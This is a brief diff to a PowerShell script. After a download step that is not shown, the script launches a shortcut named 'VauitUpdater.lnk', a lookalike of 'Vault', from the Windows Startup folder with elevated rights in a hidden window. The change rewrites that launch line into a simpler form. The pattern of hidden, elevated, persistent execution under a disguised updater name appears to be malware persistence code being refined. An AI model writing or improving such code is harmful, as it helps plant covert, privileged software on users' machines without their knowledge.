@@ -9,4 +9,4 @@ try {
 } catch {
     Write-Host "Download Error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
-Start-Process powershell.exe -Verb RunAs -ArgumentList '-WindowStyle Hidden -Command "Start-Process \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitUpdater.lnk\" -WindowStyle Hidden"'
+Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\VauitUpdater.lnk" -Verb RunAs -WindowStyle Hidden
